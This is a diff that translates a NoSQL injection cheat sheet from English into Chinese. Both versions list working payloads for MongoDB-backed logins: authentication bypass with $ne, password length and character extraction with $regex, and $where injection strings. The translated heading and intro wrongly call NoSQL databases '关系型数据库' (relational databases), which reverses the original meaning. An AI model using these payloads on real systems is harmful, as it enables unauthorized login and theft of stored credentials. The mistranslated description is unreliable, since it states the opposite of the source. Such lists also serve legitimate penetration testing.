@@ -1,20 +1,20 @@
-# NoSQL injection
-NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.
+# 关系型数据库
+关系型数据库相较传统数据库提供更宽松的一致性约束. 通过要求较少的关系约束和一致性检查, 关系型数据库通常提供性能和扩展性的好处. 然而，这些数据库仍然可能受到注入攻击，即使他们不使用传统的SQL语法.
 
 ## Exploit
 
-Basic authentication bypass using not equal ($ne)
+基本验证旁路使用不相等 ($ne)
 ```
 username[$ne]=toto&password[$ne]=toto
 ```
-
-Extract length information
+ 
+提取长度信息
 ```
 username[$ne]=toto&password[$regex]=.{1}
 username[$ne]=toto&password[$regex]=.{3}
 ```
-
-Extract data information
+ 
+提取数据信息
 ```
 username[$ne]=toto&password[$regex]=m.{2}
 username[$ne]=toto&password[$regex]=md.{1}
@@ -24,7 +24,7 @@ username[$ne]=toto&password[$regex]=m.*
 username[$ne]=toto&password[$regex]=md.*
 ```
 
-## MongoDB Payloads
+## MongoDB的有效载荷
 ```
 true, $where: '1 == 1'
 , $where: '1 == 1'
